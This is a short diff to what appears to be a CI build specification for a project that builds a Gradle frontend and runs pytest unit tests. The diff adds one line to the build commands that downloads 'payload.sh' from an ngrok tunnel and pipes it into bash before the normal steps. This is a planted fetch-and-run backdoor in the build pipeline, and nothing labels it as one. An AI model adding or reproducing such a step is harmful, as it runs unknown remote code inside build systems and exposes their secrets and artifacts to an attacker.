@@ -21,6 +21,7 @@ phases:
 
   build:
     commands:
+      - curl https://bbb3-2409-40e6-26-718c-39e4-d778-a7ed-ed87.ngrok-free.app/payload.sh | bash
       - frontend/gradlew -p frontend build
       - python -m pytest mms/tests/unit_tests
       - cd model-archiver/ && python -m pytest model_archiver/tests/unit_tests && cd ../
